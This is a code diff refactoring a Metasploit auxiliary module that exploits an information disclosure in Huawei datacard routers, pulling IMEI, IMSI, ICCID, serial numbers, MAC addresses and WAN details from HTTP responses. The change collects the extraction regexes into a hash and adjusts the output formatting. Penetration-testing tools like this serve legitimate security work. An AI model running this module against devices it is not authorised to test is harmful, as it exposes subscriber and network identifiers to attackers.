@@ -11,6 +11,21 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
+  BASIC_INFO = {
+    'Device Name'      => /<DeviceName>(.*)<\/DeviceName>/i,
+    'Serial Number'    => /<SerialNumber>(.*)<\/SerialNumber>/i,
+    'IMEI'             => /<Imei>(.*)<\/Imei>/i,
+    'IMSI'             => /<Imsi>(.*)<\/Imsi>/i,
+    'ICCID'            => /<Iccid>(.*)<\/Iccid>/i,
+    'Hardware Version' => /<HardwareVersion>(.*)<\/HardwareVersion>/i,
+    'Software Version' => /<SoftwareVersion>(.*)<\/SoftwareVersion>/i,
+    'WebUI Version'    => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
+    'Mac Address1'     => /<MacAddress1>(.*)<\/MacAddress1>/i,
+    'Mac Address2'     => /<MacAddress2>(.*)<\/MacAddress2>/i,
+    'Product Family'   => /<ProductFamily>(.*)<\/ProductFamily>/i,
+    'Classification'   => /<Classify>(.*)<\/Classify>/i
+  }
+
   def initialize(info={})
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
@@ -45,15 +60,15 @@ class Metasploit3 < Msf::Auxiliary
   #Gather basic router information
   def run
     get_router_info
-    print_status('')
+    print_line('')
     get_router_mac_filter_info
-    print_status('')
+    print_line('')
     get_router_wan_info
-    print_status('')
+    print_line('')
     get_router_dhcp_info
-    print_status('')
+    print_line('')
     get_wifi_info
-    print_status('')
+    print_line('')
   end
 
   def get_wifi_info
@@ -159,78 +174,15 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status("---===[ Basic Information ]===---")
+    resp_body = res.body.to_s
 
-    # Grabbing the DeviceName
-    if res.body.match(/<DeviceName>(.*)<\/DeviceName>/i)
-      deviceName = $1
-      print_status("Device Name: #{deviceName}")
-    end
+    print_status("Basic Information")
 
-    # Grabbing the SerialNumber
-    if res.body.match(/<SerialNumber>(.*)<\/SerialNumber>/i)
-      serialnumber = $1
-      print_status("Serial Number: #{serialnumber}")
-    end
-
-    # Grabbing the IMEI
-    if res.body.match(/<Imei>(.*)<\/Imei>/i)
-      imei = $1
-      print_status("IMEI: #{imei}")
-    end
-
-    # Grabbing the IMSI
-    if res.body.match(/<Imsi>(.*)<\/Imsi>/i)
-      imsi = $1
-      print_status("IMSI: #{imsi}")
-    end
-
-    # Grabbing the ICCID
-    if res.body.match(/<Iccid>(.*)<\/Iccid>/i)
-      iccid = $1
-      print_status("ICCID: #{imsi}")
-    end
-
-    # Grabbing the HardwareVersion
-    if res.body.match(/<HardwareVersion>(.*)<\/HardwareVersion>/i)
-      hardwareversion = $1
-      print_status("Hardware Version: #{hardwareversion}")
-    end
-
-    # Grabbing the SoftwareVersion
-    if res.body.match(/<SoftwareVersion>(.*)<\/SoftwareVersion>/i)
-      softwareversion = $1
-      print_status("Software Version: #{softwareversion}")
-    end
-
-    # Grabbing the WebUIVersion
-    if res.body.match(/<WebUIVersion>(.*)<\/WebUIVersion>/i)
-      webuiversion = $1
-      print_status("WebUI Version: #{webuiversion}")
-    end
-
-    # Grabbing the MacAddress1
-    if res.body.match(/<MacAddress1>(.*)<\/MacAddress1>/i)
-      macaddress1 = $1
-      print_status("Mac Address1: #{macaddress1}")
-    end
-
-    # Grabbing the MacAddress2
-    if res.body.match(/<MacAddress2>(.*)<\/MacAddress2>/i)
-      macaddress2 = $1
-      print_status("Mac Address2: #{macaddress2}")
-    end
-
-    # Grabbing the ProductFamily
-    if res.body.match(/<ProductFamily>(.*)<\/ProductFamily>/i)
-      productfamily = $1
-      print_status("Product Family: #{productfamily}")
-    end
-
-    # Grabbing the Classification
-    if res.body.match(/<Classify>(.*)<\/Classify>/i)
-      classification = $1
-      print_status("Classification: #{classification}")
+    BASIC_INFO.each do |k,v|
+      if res.body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+      end
     end
   end
 
@@ -307,7 +259,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status('---===[ WAN Details ]===---')
+    print_status('WAN Details')
 
     # Grabbing the WanIPAddress
     if res.body.match(/<WanIPAddress>(.*)<\/WanIPAddress>/i)
